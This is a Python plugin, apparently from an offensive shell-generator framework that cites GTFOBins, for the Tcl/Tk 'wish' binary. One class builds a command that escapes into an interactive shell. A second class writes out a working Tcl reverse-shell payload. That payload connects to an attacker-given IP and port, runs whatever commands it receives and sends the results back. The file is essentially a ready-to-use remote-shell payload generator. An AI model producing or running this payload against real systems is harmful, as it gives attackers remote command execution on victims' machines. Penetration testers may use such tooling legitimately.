from ogabog.cores import plugin, const


class Shell(plugin.BaseShell):
    def __init__(self):
        super().__init__()
        # self.shell_type = 0
        self.is_interactive = True
        self.add_args(
            "--shell",
            default="bash",
            choices=const.LINUX_SHELL,
            help="Select shell type on target machine"
        )
        self.opts.description = "https://gtfobins.github.io/gtfobins/wish/"
        self.opts.description += "\nModule author: Nong Hoang Tu <dmknght@parrotsec.org>"

    def make_shell(self):
        self.shell = f"wish\nexec {self.args.shell} <@stdin >@stdout 2>@stderr"


class ReverseTCP(plugin.ReverseShell):
    def __init__(self):
        super().__init__()
        self.add_args(
            "--shell",
            default="bash",
            choices=const.LINUX_SHELL,
            help="Select shell type on target machine"
        )
        self.extension = "sh"
        self.is_interactive = False
        self.set_write_file()
        self.opts.description = "https://gtfobins.github.io/gtfobins/wish/"
        self.opts.description += "\nModule author: Nong Hoang Tu <dmknght@parrotsec.org>"

    def make_shell(self):
        self.shell = f"echo 'set s [socket {self.args.ip} {self.args.port}];while 1 "
        self.shell += "{ puts -nonewline $s \"> \";flush $s;gets $s c;set e \"exec $c\";"
        self.shell += "if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | wish"
